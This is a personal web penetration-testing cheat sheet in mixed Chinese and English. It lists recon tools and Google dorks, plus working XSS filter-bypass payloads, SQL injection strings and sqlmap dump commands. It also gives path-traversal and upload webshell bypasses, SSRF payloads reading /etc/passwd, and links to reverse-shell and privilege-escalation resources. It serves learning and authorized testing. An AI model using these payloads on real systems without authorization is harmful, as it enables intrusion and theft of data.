Web_Pentest
===

Table of Contents
====
*  [別的大神的筆記資源](#別的大神的筆記資源)
*  [Tools](#tools)
    *  [別的大神整理的工具](#別的大神整理的工具)
    *  [OSINT/Recon](#OSINT)
        *  [image](#image)
        *  [DNS/IP](#DNS/IP)
        *  [web_info](#web_info)
        *  [mail](#mail)
    *  [convert](#convert)  
*  [Information Leakage & search for vulnerbility](#Information-Leakage-&-search-for-vulnerbility) 
    *  [Google Haking](#Google-Haking)
    *  [web leak information](#web-leak-information)
*  [WEB exploitation](#WEB-exploitation) 
    *  [XSS](#XSS)
    *  [SQL injection](#SQL-injection)
    *  [LFI/upload](#LFI)
    *  [SSRF](#SSRF)
 

# 別的大神的筆記資源
- https://github.com/wiiwu959/Pentest-Record
- https://github.com/stevenyu113228/My-Security-Resources
- https://github.com/we1h0/redteam-tips
- https://github.com/Wh0ale/SRC-experience
- https://github.com/0verSp4ce/DoraBox
- 

# Tools

## 別的大神整理的工具
- https://github.com/infosecn1nja/Red-Teaming-Toolkit
- https://github.com/safe6Sec/PentestNote
- https://github.com/ghealer/TaoTie
- 
## OSINT/Recon

- https://github.com/Paper-Pen/GatherInfo

### image
- https://tineye.com/
- https://pimeyes.com/en
- image Forensic & steganography
   - https://fotoforensics.com/
   - https://stylesuxx.github.io/steganography/
   - https://futureboy.us/stegano/decinput.html

### rustscan

```
desktop_computer Debian / Kali

Download the .deb file from the releases page:

https://github.com/RustScan/RustScan/releases

https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb

Run the command `dpkg -i` on the file.

Note: sometimes you can double click the file to achieve the same result.
```

### DNS/IP
- https://sitereport.netcraft.com/
- https://dnsdumpster.com/
- https://securitytrails.com/dns-trails
- https://talosintelligence.com/reputation_center/
- https://www.ipaddress.com/
- https://www.twnic.tw/whois_n.php
- https://whois.tanet.edu.tw/
- https://tools.keycdn.com/traceroute

### web_info
- https://web-check.xyz/
- https://www.webhostingsecretrevealed.net/zh-TW/
- https://www.virustotal.com/gui/home/url
- https://crt.sh/
- https://builtwith.com/zh/
- https://web.archive.org/

### subdomain
- https://crt.sh/
- https://www.virustotal.com/gui/home/url
- https://dnsdumpster.com/

### scanner
- https://www.shodan.io/
- https://en.fofa.info/
- https://www.zoomeye.org/


### mail
- https://verify-email.org/
- https://mxtoolbox.com/EmailHeaders.aspx
- https://www.ipaddress.com/trace-email.html

## convert/decode/decrypt/
- https://www.asciitohex.com/
- https://gchq.github.io/CyberChef/
- https://www.onlineconverter.com/

### hash
- https://md5decrypt.net/
- https://www.cmd5.com/

## fingerprint information
- 目標資產偵察 : https://intelx.io/
- 情報蒐查 : https://phonebook.cz/


# Information Leakage & search for vulnerbility

## Google Hacking
- https://www.exploit-db.com/
- https://dorksearch.com/
- https://pentest-tools.com/information-gathering/google-hacking#
 
```
- sensitive directory:   
   - index of:/robots.txt
   - index of:/.svn
   - index of:/.git
   - index of:/.htaccess
   - ...
   
   - inurl:access.log
   - inurl:error.log
   - inurl:"admin"
   - ...
   
   - inurl:"admin.php"
   - inurl:"login.aspx"
   - inurl:"login.php"
   - ...
   
   - inurl:"phpMyAdmin"
   - inurl:"access.log"
   - ...
   
   - 運用inurl特性靈活過濾:臺灣domain: inurl:.tw、site:.tw
```
## web leak information

- JS Leak : https://github.com/Roc-L8/JSFinderPlus

## sensitive directory/path

- .git 
- .svn 
- robots.txt
- .htaccess 
- web.config

## Port vuln exploit
### 21/ftp
- https://medium.com/@kubotortech/pentesting-exploiting-ftp-cba8ec81968e
```
connect command:
> ftp <IP>
> telnet <IP>
> nc -C
```

# WEB exploitation

- https://github.com/splitline/How-to-Hack-Websites
- https://github.com/w181496/Web-CTF-Cheatsheet

## XSS

- https://github.com/BlackFan/content-type-research

### 心得與找security bug的方法:

1.找到注入點:

反射型XSS常出現在`搜尋框`、`url`、`登入頁面`**(出現在GET參數後機率高)**

儲存型XSS常出現在`留言板` **(可以用Google Hacking搜尋`intext:"留言板" AND site:xxx.xxx.xxx`、`intitle:"留言板 AND site:xxx.xxx.xxx"`)**

2.注入基本payload觀察回應:

我自己常用 ``` "><script>alert(1)</script> ```，常會出現以下情況:

    - 直接噴alert框
    
    - <script>被擋掉 --> 
    
      換tag bypass (<iframe>、<img>)
      
      編碼 bypass (url encode、double url encode、html entities...)
      
      雙tag bypass (<scr<script>ipt>alert(1)</scr</script>ipt>)
      
      大小寫混和 bypass (<ScRiPt>alert(1)</ScRiPt>)
      
      雙tag + 大小寫混和 bypass (<ScR<script>IpT>)

3.利用**滑鼠右鍵** --> **檢查**，找出漏洞可能出現的地方，通常出現在網頁上

4.繼續依照source code修改payload，一邊必須觀察可能的filter，並靈活運用bypass

Basic payload:
```
- "><script>alert(1)</script>
- '>alert(1)</script>
- <iframe onload="alert(1)"></iframe>
- <script>alert(1)</script>
```

filter bypass:
```
- [%27al\x65rt%27](document.domain);//
- window[‘alert’](0)
- parent[‘alert’](1)
- self[‘alert’](2)
- top[‘alert’](3)
- this[‘alert’](4)
- frames[‘alert’](5)
- content[‘alert’](6)
- constructor.constructor(“aler”+”t(3)”)();
- [].filter.constructor(‘ale’+’rt(4)’)();
- top[“al”+”ert”](5);
- top[8680439..toString(30)](7);
- top[/al/.source+/ert/.source](8);
- top[‘al\x65rt’](9);
```
> by https://medium.com/@tobydavenn/dom-xss-on-a-gov-domain-bypassing-waf-93daec67fda9
> https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309


### payload
- https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
- https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec
- https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf
- https://netsec.expert/posts/xss-in-2021/
- https://www.gushiciku.cn/pl/plU2/zh-tw
- https://xss.js.org/#/

## SQL injection

### 心得與找security bug的方法:

test:
```
http://example.com?id=1'

http://example.com?id=' or 1=1 --  
http://example.com?id=' or 1=2 --   

http://example.com?id=1%27 
```

1.找到注入點:

SQL injection常出現在`搜尋框`、`url`、`登入頁面(有機會非法登入)`**(出現在GET參數後機率高)**

2.注入基本payload觀察回應:

我自己常用 **' or 1=1 --** 或 **admin' or 1=1 --**，常會出現以下情況:

- 直接登入

- 帳號密碼錯誤或其它錯誤

- 根本沒東西

### bypass:
**繞過方法與xss大同小異**

- 編碼 bypass
    - 空白:`%20、+、`
- 大小寫混和 bypass
- 註解 bypass(須注意不同DB使用的語法): `--` 可替換為:`/**/`、`#`、

### sqlmap

**GET method:** `sqlmap -u "http://example.com?id=1" ` `-p`指定parameter

**POST method:** `sqlmap -u "http://example.com" --method POST`

**HTTP header injection:** `--headers` or `-H` 在header值的地方加上 `*`

add `--dump`, `--dbs`, `--random-agent`

--dump --> 拿到資料庫
--dump -D <db> -tables --> 拿到 table name
--dump -D <db> -T <table> -columns --> 拿到columns name
--dump -D <db> -T <table> -C <column> --> dump 值


## LFI

protocal:
- `file://`
- `gopher://`
- ...

Path traversal:
`file:../../../../../../../../{path}` (越多越好)
   - bypass:
      - `....//....//....//....//....//`
      - `../\../\../\../\../\../\`
      - url encode、double url encode
      
### upload

Basic webshell filename:
- `shell.php`
- `shell.asp`

bypass filename:
```
shell.php
shell.pHp
shell.PhP
shell.php;jpg
shell.php.jpg
```

### Test webshell:
- `<?php phpInfo();?>`

## SSRF

### Test for SSRF vulnerbility
```
http://example.com?url={payload}

http://example.com?lang={payload}
```
### Basic payload:
```
127.0.0.1

localhost

192.168.0.1

127.00000.00000.00001

127.0.1

127.1

localhost
```

## SSRF to LFI

```
http://example.com?url=file:///etc/passwd  #for linux OS

http://example.com?url=...
- php://filter/convert.base64-encode/resource=index.php
- php://filter/convert.base64-decode/resource=index.php
```

# Post-PT

## Reverse shell

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/735b0d2277b39cda75af2855362fd5e8ae50b3db/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- Generator：https://www.revshells.com/

## Linux Privilege Escalating

- https://gtfobins.github.io/#
- https://github.com/rebootuser/LinEnum
- https://github.com/mzet-/linux-exploit-suggester
- exploit : https://github.com/SecWiki/linux-kernel-exploits
- https://github.com/AlessandroZ/BeRoot/tree/master/Linux

## Windows Privilege Escalating

- https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
